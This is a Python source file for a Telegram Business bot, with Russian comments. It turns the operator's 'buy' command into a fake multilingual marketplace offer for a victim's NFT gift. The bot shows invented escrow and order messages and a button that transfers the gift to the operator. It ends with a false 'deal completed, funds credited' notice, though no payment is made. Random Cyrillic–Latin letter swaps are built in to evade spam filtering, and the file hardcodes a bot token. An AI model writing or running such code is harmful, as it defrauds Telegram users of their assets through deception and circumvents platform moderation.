"""
Telegram Business-бот: buy <ссылка на NFT> <сумма> <stars|ton> <ru|en|ar|zh>
Установка: pip install -r requirements.txt
Запуск:    python bot.py
"""
import asyncio
import html
import json
import os
import random
import string
import httpx

# ===================== НАСТРОЙКИ =====================
BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"

# ID премиум-эмодзи
EMOJI_STAR  = "5920433463428650761" 
EMOJI_CHECK = "5776375003280838798"
EMOJI_CROSS = "5778527486270770928"

# {username} = ваш ник (владельца бизнес-аккаунта)
ACCEPT_URL = "tg://send_gift?to={username}"
ACCEPT_URL_FALLBACK = "https://t.me/{username}"
# =====================================================

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
STATE_FILE = "state.json"

connections: dict[str, dict] = {}
state: dict[str, dict] = {}

if os.path.exists(STATE_FILE):
    try:
        state = json.load(open(STATE_FILE, encoding="utf-8"))
    except Exception:
        state = {}

def save_state():
    json.dump(state, open(STATE_FILE, "w", encoding="utf-8"), ensure_ascii=False)

def em(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

def gen_order_id():
    part1 = ''.join(random.choices(string.hexdigits.upper(), k=6))
    part2 = ''.join(random.choices(string.hexdigits.upper(), k=1))
    return f"TG-{part1}-{part2}"

# ---------- ИДЕАЛЬНО НЕЗАМЕТНАЯ ПОДМЕНА ----------
SPOOF_MAP = {
    'а': 'a', 'А': 'A', 'е': 'e', 'Е': 'E', 'о': 'o', 'О': 'O',
    'р': 'p', 'Р': 'P', 'с': 'c', 'С': 'C', 'у': 'y', 'У': 'Y',
    'х': 'x', 'Х': 'X', 'a': 'а', 'A': 'А', 'e': 'е', 'E': 'Е',
    'o': 'о', 'O': 'О', 'p': 'р', 'P': 'Р', 'c': 'с', 'C': 'С',
    'y': 'у', 'Y': 'У', 'x': 'х', 'X': 'Х',
}

def spoof(text: str, ratio: float = 0.15) -> str:
    res = []
    in_tag = False
    for ch in text:
        if ch == '<': in_tag = True
        elif ch == '>': in_tag = False
        
        if not in_tag and ch in SPOOF_MAP and random.random() < ratio:
            res.append(SPOOF_MAP[ch])
        else:
            res.append(ch)
    return "".join(res)

# ---------- ТЕКСТЫ ----------
TEXTS = {
    "ru": {
        "offer_text": "Пользователь Предлагает Вам\n\n{amount} {star} за подарок {gift_link}.\n\nПредложение действует еще 5 ч. 59 мин.",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "declined_text": "Заказ <b>{order_id}</b>\n\n{cross} Вы отклонили предложение.",
        "deal_text": "<b>Сделка с NFT</b>\n\nЗаказ <b>{order_id}</b>\n\nПокупатель зарезервировал {amount} {star} средства защищены и\nбудут автоматически зачислены на ваш баланс сразу после\nпередачи подарка.\n\n<b>Инструкция для завершения сделки:</b>\n1. Нажмите «Передать подарок» и выберите {gift_name}\n2. Подтвердите передачу подарка.\n\nПлатформа зафиксирует сделку и моментально зачислит {amount} {star}\nна ваш баланс. Резерв действует 24 часа.",
        "btn_give": "Передать подарок",
        "btn_confirm": "Подтвердить передачу"
    },
    "en": {
        "offer_text": "User offers you\n\n{amount} {star} for the gift {gift_link}.\n\nOffer valid for 5 h. 59 min.",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "declined_text": "Order <b>{order_id}</b>\n\n{cross} You declined the offer.",
        "deal_text": "<b>NFT Deal</b>\n\nOrder <b>{order_id}</b>\n\nBuyer reserved {amount} {star} funds are protected and\nwill be automatically credited to your balance immediately after\nthe gift is transferred.\n\n<b>Instructions to complete the deal:</b>\n1. Click 'Give Gift' and select {gift_name}\n2. Confirm the gift transfer.\n\nThe platform will record the deal and instantly credit {amount} {star}\nto your balance. The reserve is valid for 24 hours.",
        "btn_give": "Give Gift",
        "btn_confirm": "Confirm Transfer"
    },
    "ar": {
        "offer_text": "المستخدم يعرض عليك\n\n{amount} {star} مقابل الهدية {gift_link}.\n\nالعرض صالح لمدة 5 ساعات و 59 دقيقة.",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "declined_text": "طلب <b>{order_id}</b>\n\n{cross} لقد رفضت العرض.",
        "deal_text": "<b>صفقة NFT</b>\n\nطلب <b>{order_id}</b>\n\nاحتفظ المشتري بمبلغ {amount} {star} الأموال محمية وسيتم\nإضافتها تلقائيًا إلى رصيدك فور نقل الهدية.\n\n<b>تعليمات لإتمام الصفقة:</b>\n1. انقر على 'تقديم الهدية' واختر {gift_name}\n2. أكد نقل الهدية.\n\nستسجل المنصة الصفقة وتضيف {amount} {star}\nعلى الفور إلى رصيدك. الحجز صالح لمدة 24 ساعة.",
        "btn_give": "تقديم الهدية",
        "btn_confirm": "تأكيد النقل"
    },
    "zh": {
        "offer_text": "用户向您报价\n\n{amount} {star} 购买礼物 {gift_link}。\n\n报价有效期为 5 小时 59 分钟。",
        "btn_accept": "接受",
        "btn_decline": "拒绝",
        "declined_text": "订单 <b>{order_id}</b>\n\n{cross} 您已拒绝该报价。",
        "deal_text": "<b>NFT 交易</b>\n\n订单 <b>{order_id}</b>\n\n买家已预留 {amount} {star} 资金已受保护，转移礼物后将自动记入您的余额。\n\n<b>完成交易的说明：</b>\n1. 点击“赠送礼物”并选择 {gift_name}\n2. 确认礼物转移。\n\n平台将记录交易并立即将 {amount} {star} 记入您的余额。预留有效期为 24 小时。",
        "btn_give": "赠送礼物",
        "btn_confirm": "确认转移"
    }
}

def cur_html(cur: str) -> str:
    if cur == "stars":
        return em(EMOJI_STAR, "⭐️")
    return html.escape(cur.upper())

def gift_html(link: str) -> str:
    slug = link.rstrip("/").split("/")[-1]
    if "-" in slug:
        n, i = slug.rsplit("-", 1)
        name = f"{n} #{i}"
    else:
        name = slug
    return f'<a href="{html.escape(link)}">{html.escape(name)}</a>'

def preview(link: str) -> dict:
    return {"url": link, "show_above_text": True, "prefer_large_media": True}

async def call(client: httpx.AsyncClient, method: str, **params):
    r = await client.post(f"{API}/{method}", json=params, timeout=70)
    data = r.json()
    if not data.get("ok"):
        print(f"[API ERROR] {method}: {data}")
    return data

def offer_keyboard(t: dict) -> dict:
    return {"inline_keyboard": [[
        {"text": t["btn_accept"], "callback_data": "ok", "icon_custom_emoji_id": EMOJI_CHECK},
        {"text": t["btn_decline"], "callback_data": "no", "icon_custom_emoji_id": EMOJI_CROSS},
    ]]}

async def get_connection(client, bc_id: str) -> dict:
    if bc_id not in connections:
        res = await call(client, "getBusinessConnection", business_connection_id=bc_id)
        if res.get("ok"):
            u = res["result"]["user"]
            connections[bc_id] = {"user_id": u["id"], "username": u.get("username", "user")}
    return connections.get(bc_id, {})


# ---------- ОБРАБОТКА КОМАНДЫ ----------
async def handle_business_message(client, msg: dict):
    bc_id = msg.get("business_connection_id")
    text = msg.get("text") or ""
    if not bc_id or not text.lower().startswith("buy"):
        return

    conn = await get_connection(client, bc_id)
    if not conn or msg.get("from", {}).get("id") != conn["user_id"]:
        return

    parts = text.split()
    if len(parts) < 3 or parts[0].lower() != "buy":
        return
    
    raw_link = parts[1]
    amount = parts[2]
    cur = parts[3].lower() if len(parts) > 3 else "stars"
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    
    link = raw_link
    if not link.startswith("http"):
        link = "https://" + link
        
    if "t.me/nft/" not in link:
        return

    if lang not in TEXTS:
        lang = "ru"

    chat_id = msg["chat"]["id"]
    mid = msg["message_id"]
    t = TEXTS[lang]
    order_id = gen_order_id()

    gift_link_html = gift_html(link)
    body = t["offer_text"].format(
        amount=html.escape(amount),
        star=cur_html(cur),
        gift_link=gift_link_html
    )
    
    body_spoofed = spoof(body, ratio=0.15)

    params = dict(
        business_connection_id=bc_id,
        chat_id=chat_id,
        text=body_spoofed,
        parse_mode="HTML",
        link_preview_options=preview(link),
        reply_markup=offer_keyboard(t)
    )

    # 1. ПЫТАЕМСЯ ОТРЕДАКТИРОВАТЬ СУЩЕСТВУЮЩЕЕ СООБЩЕНИЕ (работает даже для незнакомцев)
    edit_params = params.copy()
    edit_params["message_id"] = mid
    res = await call(client, "editMessageText", **edit_params)

    if res.get("ok"):
        # Если редактирование прошло успешно - сохраняем стейт
        state[f"{chat_id}:{mid}"] = dict(
            bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
            owner=conn["user_id"], username=conn["username"], order_id=order_id
        )
        save_state()
        return

    # 2. ЕСЛИ РЕДАКТИРОВАНИЕ НЕ УДАЛОСЬ (нет прав "Edit messages" в Business), 
    # ТОГДА УДАЛЯЕМ И ОТПРАВЛЯЕМ НОВОЕ
    print("[WARN] editMessageText failed, fallback to delete + sendMessage")
    
    del_res = await call(client, "deleteBusinessMessages",
                         business_connection_id=bc_id, message_ids=[mid])
                         
    if del_res.get("ok"):
        res = await call(client, "sendMessage", **params)
        if res.get("ok"):
            new_mid = res["result"]["message_id"]
            state[f"{chat_id}:{new_mid}"] = dict(
                bc=bc_id, link=link, amount=amount, cur=cur, lang=lang,
                owner=conn["user_id"], username=conn["username"], order_id=order_id
            )
            save_state()
        else:
            print("[ERROR] Не удалось отправить сообщение. Возможно, вы пишете незнакомцу, который еще не писал вам.")
    else:
        print("[ERROR] Не удалось удалить команду и не удалось отредактировать.")


# ---------- ОБРАБОТКА КНОПОК ----------
async def handle_callback(client, cq: dict):
    msg = cq.get("message") or {}
    chat_id = msg.get("chat", {}).get("id")
    mid = msg.get("message_id")
    key = f"{chat_id}:{mid}"
    st = state.get(key)
    if not st:
        await call(client, "answerCallbackQuery", callback_query_id=cq["id"])
        return

    t = TEXTS[st["lang"]]
    link = st["link"]
    gift_name = gift_html(link)
    cur = cur_html(st["cur"])
    amount = html.escape(st["amount"])
    order_id = st["order_id"]

    declined = cq["data"] == "no"
    
    if declined:
        new_text = t["declined_text"].format(order_id=order_id, cross=em(EMOJI_CROSS, "❌"))
        markup = {"inline_keyboard": []}
    else:
        new_text = t["deal_text"].format(
            order_id=order_id,
            amount=amount,
            star=cur,
            gift_name=gift_name
        )
        url = ACCEPT_URL.format(username=st["username"])
        markup = {"inline_keyboard": [
            [{"text": t["btn_give"], "url": url}],
            [{"text": t["btn_confirm"], "callback_data": "confirm", "icon_custom_emoji_id": EMOJI_CHECK}] 
        ]}
    
    new_text_spoofed = spoof(new_text, ratio=0.15)

    await call(client, "answerCallbackQuery", callback_query_id=cq["id"])

    edit = dict(
        business_connection_id=msg.get("business_connection_id") or st["bc"],
        chat_id=chat_id, message_id=mid,
        text=new_text_spoofed, parse_mode="HTML",
        link_preview_options=preview(link),
    )
    
    res = await call(client, "editMessageText", **edit, reply_markup=markup)
    
    if not res.get("ok") and not declined:
        url = ACCEPT_URL_FALLBACK.format(username=st["username"])
        markup = {"inline_keyboard": [
            [{"text": t["btn_give"], "url": url}],
            [{"text": t["btn_confirm"], "callback_data": "confirm", "icon_custom_emoji_id": EMOJI_CHECK}]
        ]}
        await call(client, "editMessageText", **edit, reply_markup=markup)

    if declined:
        state.pop(key, None)
        save_state()


# ---------- КНОПКА ПОДТВЕРДИТЬ ----------
async def handle_confirm(client, cq: dict):
    msg = cq.get("message") or {}
    chat_id = msg.get("chat", {}).get("id")
    mid = msg.get("message_id")
    key = f"{chat_id}:{mid}"
    st = state.get(key)
    
    if st:
        new_text = f"✅ <b>Сделка завершена!</b>\n\nСредства зачислены на ваш баланс."
        await call(client, "editMessageText",
                   business_connection_id=msg.get("business_connection_id") or st["bc"],
                   chat_id=chat_id, message_id=mid,
                   text=new_text, parse_mode="HTML",
                   reply_markup={"inline_keyboard": []})
        state.pop(key, None)
        save_state()
    
    await call(client, "answerCallbackQuery", callback_query_id=cq["id"], text="Подтверждено!")


async def main():
    if not BOT_TOKEN or BOT_TOKEN.startswith("ВАШ_"):
        raise SystemExit("Укажи BOT_TOKEN в блоке НАСТРОЙКИ")
    offset = 0
    async with httpx.AsyncClient() as client:
        print("Бот запущен")
        while True:
            res = await call(client, "getUpdates", offset=offset, timeout=50,
                             allowed_updates=["message", "callback_query",
                                              "business_connection", "business_message"])
            for u in res.get("result", []):
                offset = u["update_id"] + 1
                try:
                    if "business_connection" in u:
                        bc = u["business_connection"]
                        connections[bc["id"]] = {
                            "user_id": bc["user"]["id"],
                            "username": bc["user"].get("username", "user"),
                        }
                    elif "business_message" in u:
                        await handle_business_message(client, u["business_message"])
                    elif "callback_query" in u:
                        if u["callback_query"]["data"] == "confirm":
                            await handle_confirm(client, u["callback_query"])
                        else:
                            await handle_callback(client, u["callback_query"])
                except Exception as e:
                    print("ERR:", repr(e))

if __name__ == "__main__":
    asyncio.run(main())
